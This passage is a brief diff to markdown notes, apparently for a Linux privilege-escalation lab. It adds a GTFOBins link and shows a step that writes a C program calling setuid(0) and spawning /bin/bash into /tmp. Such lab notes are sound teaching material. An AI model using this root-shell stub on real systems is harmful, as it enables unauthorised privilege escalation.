@@ -97,6 +97,8 @@ Linux VM
 ## **Exploitation**
 Linux VM
 
+Read [this](https://gtfobins.github.io/gtfobins/env/) for simpler exploit...
+
 1. In command prompt type:
 ```
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
